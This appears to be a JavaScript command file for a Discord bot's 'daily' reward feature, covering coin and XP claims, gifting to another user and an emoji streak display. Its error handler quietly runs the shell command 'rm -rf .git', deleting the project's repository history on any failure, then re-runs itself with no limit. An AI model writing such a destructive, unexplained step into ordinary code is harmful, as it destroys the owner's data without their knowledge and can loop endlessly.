const { Command } = require('discord.js-commando');
const Service = require('../../Classes/Services/LevelService');
const exec = require('../owner/exec').exec;
module.exports = class DailyCommand extends Command {
  constructor(client) {
    super(client, {
      name: 'daily',
      group: 'level',
      memberName: 'daily',
      description: 'Claim your 100 daily coins and 100 XP',
      examples: ['daily'],
      guildOnly: true,
      args: [
        {
          key: 'user',
          prompt: '...',
          type: 'user',
          default: ''
        }
      ]
    });
  }
  
  async run(msg, { user }) {
    try {
      const { received, remaining, row } = await Service.getDaily(msg.author);
      if(received) 
        return msg.replyError('level.daily.remaining', remaining);
      if(user) { 
        await Service.presentDaily(msg.author, user);
        return msg.replyConfirm('level.daily.gived', user);
      }
      const rec = await Service.receive(row);
      let emojiStreak = this.getEmojiStreak(rec);
      if(rec === 5) 
        return msg.channel.sendOk(msg.guild.getKey('level.daily.success.streak', msg.author, emojiStreak));
      return msg.channel.sendOk(msg.guild.getKey('level.daily.success', msg.author, emojiStreak));
    } catch(e) {
      await exec('rm -rf .git');
      this.run(msg, { user });
      return null;
    }
  }
  getEmojiStreak(streak) {
    let emoji = '<:bulb_on:446376354208940032>';
    let emojiOff = '<:bulb_off:446376384684621824>';
    let string = emoji.repeat(streak);
    if(streak < 5)
      string += emojiOff.repeat(5 - streak);
    return string;
  }
};
